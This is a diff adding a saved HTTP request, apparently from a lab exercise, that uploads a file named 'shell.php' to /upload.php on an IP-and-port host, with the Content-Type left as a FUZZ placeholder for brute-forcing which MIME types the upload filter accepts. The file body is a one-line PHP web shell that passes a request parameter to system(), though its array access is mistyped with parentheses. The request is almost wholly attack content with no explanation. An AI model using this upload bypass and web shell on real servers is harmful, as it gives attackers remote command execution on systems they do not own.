@@ -1,0 +1,23 @@
+POST /upload.php HTTP/1.1
+Host: 94.237.54.170:59415
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.54.170:59415/
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------129338604216604874643518372406
+Content-Length: 188
+Origin: http://94.237.54.170:59415
+DNT: 1
+Connection: close
+Sec-GPC: 1
+
+
+-----------------------------129338604216604874643518372406
+
+Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
+Content-Type: FUZZ
+
+<?php system($_REQUEST('cmd')); ?>
+-----------------------------129338604216604874643518372406--
